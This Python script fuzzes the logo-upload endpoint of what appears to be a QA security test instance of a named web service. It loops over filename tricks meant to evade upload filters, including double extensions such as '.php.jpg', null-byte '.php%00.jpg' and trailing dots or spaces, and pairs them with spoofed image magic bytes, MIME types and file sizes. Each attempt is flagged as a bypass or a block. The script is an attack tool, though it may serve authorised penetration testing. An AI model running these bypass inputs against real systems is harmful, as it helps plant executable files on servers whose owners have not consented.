import requests, random, string, json
from io import BytesIO

# Configuration
URL = "https://fieldperformance.zaidyn.qa.zsservices.com/spm-qa-security-7003a/upload/logo"
COOKIE = "<YOUR_RAW_COOKIE_HEADER>"
HEADERS = {
    "Cookie": COOKIE,
    "Referer": "https://fieldperformance.zaidyn.qa.zsservices.com/spm-qa-security-7003a/ui/",
    "User-Agent": "Mozilla/5.0",
}

# Helpers
def rand_name(base, suffix):
    return f"{base}{suffix}"

def make_payload(prefix: bytes, size: int):
    return BytesIO(prefix + b"A" * (size - len(prefix)))

# Fuzzing options
filename_suffixes = [
    ".jpg", ".JPG", ".jpeg", ".JPG;", ".php.jpg", ".php%00.jpg",
    ".php.jpg ", ".jpg.php", ".php.", ".php%00", ".txt.jpg"
]
magic_prefixes = {
    'none': b'',
    'jpg': b'\xFF\xD8\xFF',
    'png': b'\x89PNG\r\n\x1A\n',
}
mimes = ["image/jpeg", "image/png", "application/octet-stream", "image/gif"]
sizes = [10, 2000, 2000000, 2100000]  # bytes

print("Starting fuzzing...\n")

for suffix in filename_suffixes:
    for mag_label, prefix in magic_prefixes.items():
        for mime in mimes:
            for sz in sizes:
                fname = rand_name("test", suffix)
                bio = make_payload(prefix, sz)
                files = {"file": (fname, bio, mime)}
                try:
                    resp = requests.put(URL, headers=HEADERS, files=files, timeout=20)
                    status = resp.status_code
                    body = resp.text.strip()
                    success = (status == 200) and not any(err in body.lower() for err in ["error", "invalid", "fail", "exceed", "too"])
                    
                    # Try to parse JSON if present
                    details = ""
                    if resp.headers.get("Content-Type", "").startswith("application/json"):
                        try:
                            j = resp.json()
                            details = f" JSON keys: {list(j.keys())}"
                            success = success and j.get("success", True)
                        except json.JSONDecodeError:
                            details = " (invalid JSON)"
                    
                    flag = "✅ BYPASS" if success else "❌ BLOCKED"
                    print(f"{flag} | {fname:20s} | mag={mag_label:3s} | mime={mime:20s} | size={sz/1024:.1f}KB | status={status}{details}")

                except Exception as e:
                    print(f"ERR | {fname:20s} | mag={mag_label} | mime={mime} | sz={sz}B → Exception: {e}")
